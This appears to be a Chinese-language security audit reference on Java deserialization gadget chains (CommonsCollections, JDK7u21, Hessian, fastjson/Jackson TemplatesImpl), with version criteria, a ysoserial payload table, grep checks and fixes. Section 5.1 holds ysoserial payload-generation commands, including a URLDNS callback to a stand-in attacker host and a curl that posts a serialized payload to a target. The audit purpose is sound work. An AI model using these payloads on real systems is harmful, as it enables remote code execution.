---
name: java-deser-gadget-chains
description: Java 反序列化 gadget 链库全景。逐条拆解 CommonsCollections1–7、JDK7u21 无第三方原生链、Hessian only-JDK 原生链、fastjson/Jackson @type 原生 TemplatesImpl JSON 链；附 ysoserial 全 payload 表与逐版本利用判据。用于「深度反序列化」主线的链库核对（入口识别→危险模式→验证方法→修复建议）。
---

# Java 反序列化 Gadget 链库全景（java-deser-gadget-chains）

> 定位：Java 反序列化主线的「链库核对层」——配合 `java-sink-reference.md`（sink 大表）与
> `java-rce.yaml`（sink 规则）使用。sink 规则回答「哪里有反序列化入口」，本手册回答
> 「这个入口有没有可利用链、什么版本/依赖下成立」。
>
> 口径：每条链给 **触发类 / 依赖库 / JDK 版本 / 是否需第三方** 四要素；「是否需第三方」指
> 除 JDK 自带类（`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 属于 JDK 自带）
> 之外是否还需额外 jar 依赖。

## 0. 快速判定流程（入口识别）

1. 找到反序列化入口（sink）：`ObjectInputStream.readObject` / `XMLDecoder` / `XStream` /
   `HessianInput` / `fastjson JSON.parse*` / `Jackson enableDefaultTyping` / `SnakeYAML` 等。
2. 核对 classpath 依赖：`mvn dependency:tree`（或 Gradle）确认是否存在 gadget 依赖
   （commons-collections 3.x/4.x、commons-beanutils、spring-*、groovy、rome、xalan 等）。
3. 核对 JDK 版本：决定链的可达性（CC1/CC3 在 JDK 8u71+ 失效，JDK7u21 在 7u25+ 失效）。
4. 输出「可利用链 + 版本判据 + 是否需第三方」三要素结论，缺条件降级为「有条件 RCE」。

---

## 1. CommonsCollections 链族（CC1–CC7 逐条拆解）

> 触发枢纽三类：`AnnotationInvocationHandler`（JDK8u71 前）、`PriorityQueue`、
> `BadAttributeValueExpException`/`Hashtable`/`HashSet` 等 JDK 自带集合类。
> 最终 sink 两类：`InvokerTransformer`/`ChainedTransformer` 直接反射调 `Runtime.exec`，
> 或 `InstantiateTransformer` + `TrAXFilter` 间接加载 `TemplatesImpl` 字节码。

| 链 | 触发类 | 依赖库 | JDK 版本判据 | 是否需第三方 |
|----|--------|--------|--------------|--------------|
| **CC1** | `sun.reflect.annotation.AnnotationInvocationHandler` | commons-collections **3.1–3.2.1** | JDK ≤ 7（JDK 8u71+ 已修 readObject 逻辑，链断） | 需（cc 3.x） |
| **CC2** | `java.util.PriorityQueue` + `TransformingComparator` | commons-collections **4.0**（cc4） | JDK 8+（不依赖 AnnotationInvocationHandler） | 需（cc 4.x） |
| **CC3** | `AnnotationInvocationHandler`（dynamic proxy 包装 `TemplatesImpl` + `TrAXFilter`） | commons-collections **3.x** | JDK ≤ 7（同 CC1 触发枢纽） | 需（cc 3.x） |
| **CC4** | `PriorityQueue` + `TransformingComparator` | commons-collections **4.0** | JDK 8+ | 需（cc 4.x） |
| **CC5** | `javax.management.BadAttributeValueExpException` | commons-collections **3.x** | JDK 8+（绕 AnnotationInvocationHandler 限制） | 需（cc 3.x） |
| **CC6** | `java.util.HashSet` → `HashMap` → `TiedMapEntry` → `LazyMap` | commons-collections **3.x** | JDK 8+（最常用 JDK8+ 载荷） | 需（cc 3.x） |
| **CC7** | `java.util.Hashtable`（hashCode 碰撞 → `LazyMap.get`） | commons-collections **3.x** | JDK 8+ | 需（cc 3.x） |

### 1.1 CC1：InvokerTransformer + AnnotationInvocationHandler（JDK ≤ 7）

```
ObjectInputStream.readObject()
  → AnnotationInvocationHandler.readObject()      // 触发枢纽
    → memberValues.entrySet() 被 Proxy 拦截
      → LazyMap.get(key)
        → ChainedTransformer.transform(Object)
          → ConstantTransformer → InvokerTransformer → Runtime.getRuntime().exec(cmd)
```

- **判据**：commons-collections 3.x 在 classpath 且 JDK ≤ 7（或 8 < 8u71）。
- **失效点**：JDK 8u71+ 修复了 `AnnotationInvocationHandler.readObject` 对 `memberValues`
  的调用方式，链在枢纽处断——这也是 CC5/CC6/CC7 出现的原因（换触发类绕修复）。

### 1.2 CC2：TemplatesImpl + PriorityQueue + commons-collections4

```
readObject() → PriorityQueue.readObject()          // 触发枢纽（JDK 自带）
  → TransformingComparator.compare(o1, o2)
    → InvokerTransformer.transform(o1)
      → TemplatesImpl.newTransformer()             // 最终 sink
        → 加载 _bytecodes 中的恶意类 → 静态块/构造器执行命令
```

- **判据**：commons-collections **4.0**（注意：`TransformingComparator` 在 cc4 中实现
  `Serializable`，这是 cc4 与 cc3 的关键差异）。
- **关键点**：`TemplatesImpl` 是 JDK 自带类（`com.sun.org.apache.xalan.internal.xsltc.trax`），
  因此「字节码加载」这一环**不需要第三方库**——第三方依赖只有 commons-collections4 一处。
- JDK 9+ 模块系统对 `TemplatesImpl` 的访问有 `--add-opens` 限制，实际利用需结合目标启动参数判定。

### 1.3 CC3：dynamic proxy + TrAXFilter（bypass 思路）

```
readObject() → AnnotationInvocationHandler.readObject()
  → ChainedTransformer.transform()
    → InstantiateTransformer.transform(TrAXFilter.class)   // 不是 InvokerTransformer
      → TrAXFilter( TemplatesImpl ) → TemplatesImpl.newTransformer() → RCE
```

- **判据**：commons-collections 3.x；JDK ≤ 7（同 CC1 触发枢纽）。
- **为什么用 TrAXFilter**：绕过只拦截 `InvokerTransformer` 的黑名单/WAF——把「反射调用」
  换成「反射实例化 `TrAXFilter`」，再由其构造函数触发 `TemplatesImpl`。
- **依赖**：`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter` 是 JDK 自带。

### 1.4 CC4：cc4 版 TrAXFilter 链

- 与 CC3 同思路（`InstantiateTransformer` + `TrAXFilter`），但把触发枢纽从
  `AnnotationInvocationHandler` 换成 `PriorityQueue` + `TransformingComparator`
  （commons-collections 4.0），从而在 JDK 8+ 可用。

### 1.5 CC5：BadAttributeValueExpException（JDK 8+ 绕修复）

```
readObject() → BadAttributeValueExpException.readObject()   // JDK 自带
  → toString() → TiedMapEntry.toString()
    → LazyMap.get(key) → ChainedTransformer → Runtime.exec
```

- **判据**：commons-collections 3.x；JDK 8+（BadAttributeValueExpException 是 JDK 自带，
  其 `readObject` 调用了 `toString`，形成替代触发枢纽）。

### 1.6 CC6：HashSet/HashMap + TiedMapEntry（JDK 8+ 最常用）

```
readObject() → HashSet.readObject() → HashMap.put() → TiedMapEntry.hashCode()
  → LazyMap.get() → ChainedTransformer → Runtime.exec
```

- **判据**：commons-collections 3.x；JDK 8+（同样 7 可用）。默认首选 JDK8+ 载荷。

### 1.7 CC7：Hashtable（hashCode 碰撞）

```
readObject() → Hashtable.readObject() → recompute hashCode 碰撞
  → TiedMapEntry.hashCode() → LazyMap.get() → ChainedTransformer → Runtime.exec
```

- **判据**：commons-collections 3.x；JDK 8+。利用两个 key 的 hashCode 碰撞触发二次 `get`。
- **备注**：CC7 构造比 CC6 复杂（需构造碰撞），误报/漏报都常见——审计时判断「依赖存在 +
  入口可控」即可定为候选，具体链可达性交动态验证。

### 1.8 审计 grep（CC 族依赖与 gadget 类）

```bash
# 依赖版本核对
mvn dependency:tree | grep -iE 'commons-collections|commons-beanutils|commons-lang'

# gadget 类命中（源码里出现这些类不一定是漏洞，但反序列化入口 + 这些依赖存在时升级关注）
grep -rn 'InvokerTransformer\|ChainedTransformer\|ConstantTransformer\|InstantiateTransformer\|TransformingComparator\|TiedMapEntry\|LazyMap\|TemplatesImpl\|BadAttributeValueExpException\|TrAXFilter' --include='*.java' .
```

---

## 2. JDK7u21 无第三方原生链

- **性质**：**不需要任何第三方依赖**，仅用 JDK 自带类即可 RCE。
- **核心类**：`javax.xml.transform.TemplatesImpl`（字节码加载）+ `sun.reflect.annotation.AnnotationInvocationHandler`
  （dynamic proxy）+ `LinkedHashSet`/`HashSet`（hashCode/equals 触发）。
- **触发骨架**：

```
LinkedHashSet.readObject() → HashSet.add()
  → 两个元素 hashCode 碰撞 → proxy(AnnotationInvocationHandler).equals()
    → equalsImpl() 反射调用 TemplatesImpl.newTransformer() → 加载恶意字节码 → RCE
```

- **版本判据**：命名来自发现时版本 **JDK 7u21**；在 **JDK 7u25** 修复（对
  `AnnotationInvocationHandler` 的成员类型检查加严）。因此仅在 **JDK 7u21 及更早** 有效。
- **审计意义**：目标为老 JDK（≤7u21）时，即使 classpath 无任何 gadget 依赖，只要存在
  反序列化入口即高危——无需依赖核对即可判定。

---

## 3. Hessian only-JDK 原生链（BlackHat 2025）

> 来源：BlackHat 2025 披露的 Hessian 反序列化 JDK 原生新链（先知社区
> <https://xz.aliyun.com/news/18935>）；背景知识参考 su18 的 Hessian 系列
> （<https://su18.org/post/hessian/>）。

- **背景**：Hessian / Hessian2（Caucho，广泛用于 Dubbo、Sofa、Motan 等 RPC）的反序列化
  与 Java 原生序列化不同——它不调用 `readObject`，而是按类型重建对象、调用 setter/构造器，
  因此传统 gadget 链（依赖 `readObject`）在 Hessian 下多数失效，需要专门的 Hessian gadget。
- **传统 Hessian 链（需第三方）**：`javax.swing.UIDefaults` + `SwingLazyValue`（JDK 自带）
  是 Hessian 利用的常见枢纽，配合 XString、MBean、Jackson 等触发 RCE；多数公开链仍依赖
  `xalan`/`commons-collections` 等第三方类。
- **only-JDK 新链（2025）**：BlackHat 2025 披露的链**仅依赖 JDK 自带类即可完成 Hessian
  反序列化 RCE**（核心仍是 `javax.swing.UIDefaults` 系列类 + 反射/类加载），消除了
  「需第三方 gadget」这一前提。
- **审计判据**：
  1. 存在 Hessian 反序列化入口（`HessianInput` / `Hessian2Input` / Dubbo 暴露的 Hessian 协议端口）；
  2. 老版本 Hessian（无 `ClassFactory`/`ObjectDeserializer` 白名单）默认允许任意类重建；
  3. JDK 版本满足链可达（含 `javax.swing` 模块，headless 环境需 `-Djava.awt.headless` 判定）。
- **修复**：升级 Hessian 版本并配置白名单反序列化器（`SerializerFactory.setAllowList` /
  `ClassFactory` 限制类加载）。

```bash
# 依赖与入口核对
mvn dependency:tree | grep -iE 'hessian|dubbo|sofa'
grep -rn 'HessianInput\|Hessian2Input\|HessianProtocolException' --include='*.java' .
```

---

## 4. JSON 链：fastjson / Jackson @type 原生 TemplatesImpl（无 JNDI 本地链）

> 两类 JSON 库的反序列化 RCE 不依赖 JNDI，走「`@type` 指定原生 `TemplatesImpl` → 加载
> `_bytecodes` 恶意字节码」的本地链——这是「JSON 内嵌反序列化链」的典型形态。

### 4.1 fastjson @type → TemplatesImpl

```
JSON.parseObject(json)   // json 含 {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":[...]}
  → autoType 实例化 TemplatesImpl
    → 设置 _bytecodes / _name / _tfactory（需 SupportNonPublicField）
      → getOutputProperties()/newTransformer() 触发字节码加载 → RCE
```

- **版本判据（逐版本）**：

| fastjson 版本 | autoType 行为 | TemplatesImpl 链可用性 |
|---|---|---|
| ≤ 1.2.24 | 默认开放 | 直接可用 |
| 1.2.25–1.2.41 | 默认关闭，`L...;` 前后缀可绕过 | 需绕过（黑名单/前缀） |
| 1.2.42 | 双 `LL...;;` 绕过 | 需绕过 |
| 1.2.47 | `java.lang.Class` 缓存绕过 | 需绕过 |
| 1.2.68 | expectClass 绕过 | 需绕过 |
| 1.2.80 | CVE-2022-25845 autoType 重开放 | 视配置 |
| 1.2.83+ / fastjson2 | 建议 safeMode | 默认禁用；注意 safeMode 非绝对兜底——1.2.83 有 jar:http+/proc/self/fd 复活链、fastjson2 有 TypeReference 泛型路径绕过（见 components/fastjson.md §2.10/§2.11） |

- **关键判据**：`TemplatesImpl` 的 `_bytecodes` 是私有字段，fastjson 需开启
  `Feature.SupportNonPublicField` 才能设置；利用还依赖目标 `ParserConfig` 是否允许该类。
- **修复**：`ParserConfig.getGlobalInstance().setSafeMode(true)` 或升级 fastjson2 并禁用 autoType。

### 4.2 Jackson default typing → TemplatesImpl

```
ObjectMapper om = new ObjectMapper();
om.enableDefaultTyping();   // 或 activateDefaultTyping(PolymorphicTypeValidator)
om.readValue(json, Object.class);
// json 含 ["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", {"transletBytecodes":[...]}]
```

- **判据**：Jackson 2.x 的 `enableDefaultTyping()`（不安全的无 validator 模式）开启时，
  攻击者可借 `TemplatesImpl`（JDK 自带）加载字节码 RCE；JDK 版本决定
  `TemplatesImpl` 字段可访问性（JDK 9+ 模块限制）。
- **修复**：禁止 `enableDefaultTyping()`；用 `activateDefaultTyping(BasicPolymorphicTypeValidator
  .builder().allowIfSubType("com.example.dto").build())` 白名单。

```bash
grep -rn 'enableDefaultTyping\|activateDefaultTyping\|@JsonTypeInfo\|@type' --include='*.java' .
grep -rn 'fastjson\|com.alibaba.fastjson\|jackson-databind' pom.xml build.gradle
```

---

## 5. ysoserial 全 payload 表（利用判据速查）

> ysoserial 官方：<https://github.com/frohoff/ysoserial>；JDK/Special payloads 细节：
> <https://deepwiki.com/frohoff/ysoserial/2.6-jdk-and-special-payloads>。
> 用法：`java -jar ysoserial.jar <Payload> "<cmd>"`（`URLDNS` 无 cmd，仅探测）。

| Payload | 触发类 / 关键组件 | 依赖库 | JDK / 版本判据 | 备注 |
|---|---|---|---|---|
| URLDNS | `java.net.URL`（hashCode → DNS 查询） | 无（JDK 自带） | 全版本 | **探测专用**，无 RCE，验证反序列化入口是否触发 |
| CommonsCollections1 | AnnotationInvocationHandler | commons-collections 3.x | JDK ≤ 7 / 8<8u71 | 最经典 |
| CommonsCollections2 | PriorityQueue + TransformingComparator | commons-collections 4.0 | JDK 8+ | TemplatesImpl 字节码 |
| CommonsCollections3 | AnnotationInvocationHandler + TrAXFilter | commons-collections 3.x | JDK ≤ 7 | 绕 InvokerTransformer 黑名单 |
| CommonsCollections4 | PriorityQueue + TrAXFilter | commons-collections 4.0 | JDK 8+ | |
| CommonsCollections5 | BadAttributeValueExpException | commons-collections 3.x | JDK 8+ | |
| CommonsCollections6 | HashSet/TiedMapEntry/LazyMap | commons-collections 3.x | JDK 8+ | JDK8+ 首选 |
| CommonsCollections7 | Hashtable（碰撞） | commons-collections 3.x | JDK 8+ | |
| CommonsBeanutils1 | BeanComparator → TemplatesImpl | commons-beanutils | 全版本（含 JDK8+） | shiro 常见 |
| Jdk7u21 | LinkedHashSet + AnnotationInvocationHandler + TemplatesImpl | 无（JDK 自带） | JDK ≤ 7u21（7u25 修复） | 无第三方原生链 |
| Spring1 | ObjectFactoryDelegatingInvocationHandler | spring-core | 全版本 | |
| Spring2 | Spring AOP | spring-aop | 全版本 | |
| Groovy1 | ConvertedClosure/MethodClosure | groovy | 全版本 | |
| ROME | ObjectBean/ToStringBean | rome | 全版本 | |
| Hibernate1/2 | Hibernate 组件 | hibernate | 全版本 | |
| C3P0 | C3P0 连接池 | c3p0 | 全版本 | 可触发 JNDI/类加载 |
| JBossInterceptors1 | JBoss interceptors | jboss-interceptors | 全版本 | |
| Myfaces1/2 | MyFaces EL | myfaces | 全版本 | |
| JRMPClient | 发起 JRMP 回连 | 无 | 全版本 | 配合 JRMPListener 二次反序列化 |
| JSON1 | Jackson TemplatesImpl | jackson-databind | 全版本 | |
| AspectJWeaver | AspectJ | aspectjweaver | 全版本 | 任意文件写 |
| FileUpload1 | DiskFileItem | commons-fileupload | 全版本 | 任意文件写 |

### 5.1 ysoserial 审计使用姿势

```bash
# 生成 payload（授权测试）
java -jar ysoserial.jar CommonsCollections6 "id" > cc6.ser
java -jar ysoserial.jar URLDNS "http://attacker.dnslog.example" > urldns.ser

# 探测：URLDNS 无第三方依赖，先确认入口可达，再按依赖逐链尝试
# 发送：Content-Type: application/x-java-serialized-object
curl -H "Content-Type: application/x-java-serialized-object" --data-binary @cc6.ser https://target/api/deser
```

> **纪律**：ysoserial 生成/触发仅限授权测试；反序列化 RCE 验证默认 whoami 级最小影响。

---

## 6. 修复建议（按层）

1. **入口层**：不可信数据禁止进入任何反序列化 API；跨服务边界用 JSON/Protobuf 等无
   原生反序列化语义的格式（架构优先）。
2. **过滤层**：JDK 9+ 用 `ObjectInputFilter`（`jdk.serialFilter` / `setObjectInputFilter`）
   做类白名单；XStream/Hessian/SnakeYAML/Jackson 各自配置 `allowList`/`SafeConstructor`/
   `PolymorphicTypeValidator`。
3. **依赖层**：移除/升级含 gadget 的旧依赖（commons-collections 3.x、旧 fastjson、旧 XStream）。
4. **运行时层**：JDK 9+ 模块系统 `--add-opens` 最小化；旧 JDK 优先升级（JDK7u21 链只在 ≤7u21 可用）。
5. **检测层**：sink 规则（`java-rce.yaml`）+ 依赖核对（`dependency:tree`）双管齐下。

## 来源

- yaklang hack-skills Java gadget 链库：<https://github.com/yaklang/hack-skills/blob/HEAD/skills/deserialization-insecure/JAVA_GADGET_CHAINS.md>
- BlackHat 2025 Hessian JDK 原生新链：<https://xz.aliyun.com/news/18935>
- ysoserial：<https://github.com/frohoff/ysoserial> ｜ JDK/Special payloads：<https://deepwiki.com/frohoff/ysoserial/2.6-jdk-and-special-payloads>
- Hessian 系列研究：<https://su18.org/post/hessian/>
